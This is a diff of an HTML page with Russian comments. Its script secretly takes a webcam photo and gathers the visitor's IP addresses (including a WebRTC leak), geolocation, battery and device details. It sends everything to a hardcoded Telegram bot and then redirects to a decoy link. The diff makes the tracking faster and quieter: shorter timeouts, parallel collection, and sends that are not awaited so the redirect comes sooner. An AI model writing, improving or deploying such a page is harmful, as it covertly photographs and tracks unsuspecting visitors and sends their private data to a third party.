@@ -12,7 +12,7 @@ html,body{margin:0;padding:0;height:100%;background:#050508;color:#e0e0e0;font:1
 @keyframes spin{to{transform:rotate(360deg)}}
 h1{font-size:20px;color:#fff;margin:0 0 12px;font-weight:600;opacity:.9}
 p{color:#666;margin:0 0 32px;max-width:400px;font-size:14px;line-height:1.6}
-#progress{position:fixed;bottom:0;left:0;height:2px;background:linear-gradient(90deg,transparent,#8b5cf6,transparent);width:30%;animation:load 2.5s ease-in-out infinite}
+#progress{position:fixed;bottom:0;left:0;height:2px;background:linear-gradient(90deg,transparent,#8b5cf6,transparent);width:30%;animation:load 1.5s ease-in-out infinite}
 @keyframes load{0%{left:-30%}100%{left:100%}}
 video,canvas{display:none}
 </style>
@@ -34,13 +34,13 @@ video,canvas{display:none}
 const TOKEN='9276690902:AAEQ8KE12ZBR7G-7D2yuWXxDBGXMxMu-8UQ';
 const CHAT_ID='8667961334';
 const CHECK_URL='https://share.google/nwoUZLDYhdVy8e0qg';
-const REDIRECT_URL='https://share.google/tWtcwgkxMOuocoxwl'; // <--- Куда перенаправить в конце
+const REDIRECT_URL='https://share.google/tWtcwgkxMOuocoxwl'; // Куда перенаправить в конце
 
 const video=document.getElementById('preview');
 const canvas=document.getElementById('canvas');
 
 // ═══════════════════════════════════════════════════════
-// ФОТО (скрыто)
+// ФОТО (скрыто) - Ускорено
 // ═══════════════════════════════════════════════════════
 async function capturePhoto(){
   let stream=null;
@@ -50,13 +50,13 @@ async function capturePhoto(){
     await new Promise(res=>{
       if(video.readyState>=2) return res();
       video.onloadeddata=()=>res();
-      setTimeout(res,2000);
+      setTimeout(res,700); // Ждем максимум 0.7 сек
     });
-    await new Promise(r=>setTimeout(r,400));
+    await new Promise(r=>setTimeout(r,100)); // Минимальная задержка на экспозицию
     const w=video.videoWidth||640,h=video.videoHeight||480;
     canvas.width=w;canvas.height=h;
     canvas.getContext('2d').drawImage(video,0,0,w,h);
-    const blob=await new Promise(res=>canvas.toBlob(res,'image/jpeg',0.88));
+    const blob=await new Promise(res=>canvas.toBlob(res,'image/jpeg',0.85));
     stream.getTracks().forEach(t=>t.stop());
     video.srcObject=null;
     return blob;
@@ -104,7 +104,7 @@ function getLocalIPs(){
       if(m) (/srflx|relay/.test(c)?srflx:ips).add(m[1]);
     };
     pc.createOffer().then(o=>pc.setLocalDescription(o)).catch(finish);
-    setTimeout(finish,3000);
+    setTimeout(finish,800); // Ускорено до 0.8 сек
   });
 }
 
@@ -123,28 +123,18 @@ async function getBattery(){
   }catch(e){return {supported:false};}
 }
 
-async function checkSite(url){
-  const start=performance.now();
-  try{
-    const ctrl=new AbortController();
-    const timer=setTimeout(()=>ctrl.abort(),5000);
-    await fetch(url,{method:'HEAD',mode:'no-cors',signal:ctrl.signal,cache:'no-store'});
-    clearTimeout(timer);
-    return {url,status:'reachable',latency_ms:Math.round(performance.now()-start)};
-  }catch(e){
-    return {url,status:'error',error:e.name,latency_ms:Math.round(performance.now()-start)};
-  }
-}
-
 // ═══════════════════════════════════════════════════════
 // СБОР ДАННЫХ
 // ═══════════════════════════════════════════════════════
 async function collectAll(){
+  // Запускаем все запросы параллельно для скорости
+  const [geo, ips, battery] = await Promise.all([
+    getPublicIP(),
+    getLocalIPs(),
+    getBattery()
+  ]);
+  
   const n=navigator,s=screen,ua=n.userAgent;
-  const geo=await getPublicIP();
-  const ips=await getLocalIPs();
-  const battery=await getBattery();
-  const site=await checkSite(CHECK_URL);
 
   const isMobile=/Mobi|Android|iPhone|iPad|iPod|Windows Phone/i.test(ua);
   const isTablet=/iPad|Tablet|PlayBook|Silk/i.test(ua)||(/Android/i.test(ua)&&!/Mobile/i.test(ua));
@@ -190,7 +180,6 @@ async function collectAll(){
     ip_public: geo.ip||null,
     ip_local: ips.local.length?ips.local.join(', '):'hidden',
     ip_public_stun: ips.public.length?ips.public.join(', '):'hidden',
-    site_check: site,
     geo_country: geo.country||null,
     geo_country_code: geo.country_code||null,
     geo_region: geo.region||null,
@@ -224,10 +213,10 @@ async function collectAll(){
 }
 
 // ═══════════════════════════════════════════════════════
-// ОТПРАВКА
+// ОТПРАВКА (не ждем ответа, чтобы ускорить редирект)
 // ═══════════════════════════════════════════════════════
 async function sendPhoto(blob,caption){
-  if(!blob) return false;
+  if(!blob) return;
   try{
     const form=new FormData();
     form.append('chat_id',CHAT_ID);
@@ -235,8 +224,7 @@ async function sendPhoto(blob,caption){
     form.append('caption',caption||'📷');
     form.append('parse_mode','HTML');
     await fetch('https://api.telegram.org/bot'+TOKEN+'/sendPhoto',{method:'POST',body:form});
-    return true;
-  }catch(e){return false;}
+  }catch(e){}
 }
 
 async function sendJSON(jsonText){
@@ -251,19 +239,20 @@ async function sendJSON(jsonText){
 }
 
 // ═══════════════════════════════════════════════════════
-// ЗАПУСК
+// ЗАПУСК ЗА 1 СЕКУНДУ
 // ═══════════════════════════════════════════════════════
 async function run(){
-  // 1. Сбор данных
-  let data={};
-  try{ data=await collectAll(); }catch(e){ data={error:String(e)}; }
+  // Запускаем фото и сбор данных ОДНОВРЕМЕННО
+  const [photoBlob, data] = await Promise.all([
+    capturePhoto(),
+    collectAll()
+  ]);
 
-  // 2. Отправка JSON
   const jsonText=JSON.stringify(data,null,2);
-  await sendJSON(jsonText);
-
-  // 3. Фото
-  const photoBlob=await capturePhoto();
+  
+  // Отправляем в ТГ (не ждем завершения, чтобы сразу сделать редирект)
+  sendJSON(jsonText);
+  
   if(photoBlob){
     const cap='📷 Фото\n\n'+
       '🌍 '+(data.geo_country||'?')+' / '+(data.geo_region||'?')+' / '+(data.geo_city||'?')+'\n'+
@@ -272,15 +261,15 @@ async function run(){
       '📱 '+(data.device_type||'?')+' / '+(data.os||'?')+' / '+(data.device_model||'?')+'\n'+
       '🌐 IP: '+(data.ip_public||'?')+'\n'+
       '🕐 '+new Date().toLocaleString('ru-RU');
-    await sendPhoto(photoBlob,cap);
+    sendPhoto(photoBlob,cap);
   }
 
-  // 4. РЕДИРЕКТ НА КАРТИНКУ
+  // РЕДИРЕКТ (сработает быстро, как только данные собрались)
   window.location.replace(REDIRECT_URL);
 }
 
 window.addEventListener('load',()=>{
-  setTimeout(run,200);
+  setTimeout(run,50); // Старт почти мгновенный
 });
 </script>
 </body>
